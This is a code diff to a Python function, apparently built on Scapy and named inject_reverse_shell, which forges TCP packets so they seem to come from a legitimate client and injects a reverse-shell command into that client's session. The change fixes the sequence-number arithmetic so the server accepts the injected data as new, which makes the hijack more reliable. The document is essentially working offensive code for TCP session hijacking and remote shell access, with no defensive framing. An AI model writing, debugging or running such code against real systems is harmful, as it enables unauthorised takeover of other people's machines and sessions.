@@ -88,13 +88,18 @@ def inject_reverse_shell(pkt):
         f" 0<&1 2>&1 \r"
     )
 
+    # The server expects the next byte at seq + len(payload already sent).
+    # We must advance seq past the sniffed payload so the server treats
+    # our injected data as new, not as a retransmission.
+    next_seq = tcp_layer.seq + len(tcp_layer[Raw])
+
     # Spoof the packet to look as if it came from the legitimate client
     spoof_ip  = IP(src=ip_layer.src, dst=ip_layer.dst)
     spoof_tcp = TCP(
         sport=tcp_layer.sport,
         dport=tcp_layer.dport,
         flags="A",
-        seq=tcp_layer.seq,
+        seq=next_seq,
         ack=tcp_layer.ack,
     )
     spoof_pkt = spoof_ip / spoof_tcp / payload
